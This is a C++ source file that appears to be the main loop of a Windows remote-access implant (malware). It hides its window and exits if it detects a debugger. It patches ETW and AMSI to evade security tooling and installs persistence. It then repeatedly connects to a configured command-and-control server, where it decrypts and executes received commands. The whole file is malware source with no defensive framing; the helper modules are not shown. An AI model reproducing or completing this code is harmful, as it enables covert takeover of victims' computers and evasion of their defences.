#include <windows.h>
#include <iostream>
#include <string>
#include "Config.h"
#include "Crypto.h"
#include "Network.h"
#include "Evasion.h"
#include "Modules.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Hide console
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Evasion checks
    if (Evasion::IsDebuggerPresentCheck()) {
        return 0; // Exit if being debugged
    }

    Evasion::PatchETW();
    Evasion::PatchAMSI();

    // Mutex to prevent multiple instances
    HANDLE hMutex = CreateMutexA(NULL, FALSE, Config::MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        return 0;
    }

    Crypto::Init(Config::AES_KEY_B64);
    Evasion::ApplyPersistence();

    // Connection loop
    Network net;
    while (true) {
        if (net.Connect(Config::C2_SERVER, Config::C2_PORT)) {
            // Send handshake
            std::string handshake = "{\"platform\":\"windows\",\"admin\":true}";
            net.Send(Crypto::Encrypt(handshake));

            // Command loop
            while (true) {
                auto packet = net.Receive();
                if (packet.empty()) break; // Disconnected

                std::string cmd = Crypto::Decrypt(packet);
                if (cmd.empty()) break;
                
                Modules::HandleCommand(cmd, net);
            }
            net.Close();
        }
        
        // Sleep before reconnecting (5 seconds + jitter)
        Sleep(5000 + (rand() % 5000));
    }

    return 0;
}
